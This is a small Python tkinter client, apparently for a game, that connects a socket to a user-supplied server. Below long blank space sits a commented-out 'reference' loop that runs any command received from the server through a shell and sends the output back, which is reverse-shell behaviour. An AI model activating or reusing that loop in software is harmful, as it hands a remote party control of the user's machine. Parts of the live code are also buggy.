import socket
from tkinter import *


#defines variables
global s
s = socket.socket()


#define functions

#call this function to connect to remote server
def connectto_server(event):

    #this function connects the info
    def finalconnect(event):

        try:
            host = e1.get()
            rawport = e2.get()
            port = int(rawport)
            s.connect((host, port))
        except socket.error as msg:
            connect_window.destroy()
            connectto_server(event)

        listen()

    connect_window = Tk()
    Label(connect_window, text="IP Address").grid(row=0, sticky=W)
    e1 = Entry(connect_window)
    e1.grid(row=0, column=2)
    Label(connect_window, text="Port").grid(row=1, sticky=W)
    e2 = Entry(connect_window)
    e2.grid(row=1, column=2)
    submit_button = Button(connect_window, text="Submit")
    submit_button.grid(row=2, column=1)
    submit_button.bind("<Button-1>", finalconnect)
    connect_window.mainloop()
    print(error)
    #m = Label(connect_window, text=error[''])
    #m.pack()




# this function is called by the connectto_server function and forces
# client to listen for commands from server.
def listen():
    while True:
        data = s.recv(1024)

#main window

#starts the window
root = Tk()


mycanvas = Canvas(root)
mycanvas.grid(row=1, column=2, columnspan=10, rowspan=10)
connect_button = Button(root, text="Connect To Server")
connect_button.grid(row=0, column=1)
connect_button.bind("<Button-1>", connectto_server)
createcharacter_button = Button(root, text="Create Character")
createcharacter_button.grid(row=10, column=1)






root.mainloop()


























































#just for reference
#while True:
#    data = s.recv(1024)
 #   if data[:2].decode("utf-8") == 'cd':
  #      os.chdir(data[3:].decode('utf-8'))
   # if len(data) > 0:
    #    cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     #   output_bytes = cmd.stdout.read() + cmd.stderr.read()
      #  output_str = str(output_bytes, "utf-8")
       # s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        #print(output_str)

# Close connection
# s.close()































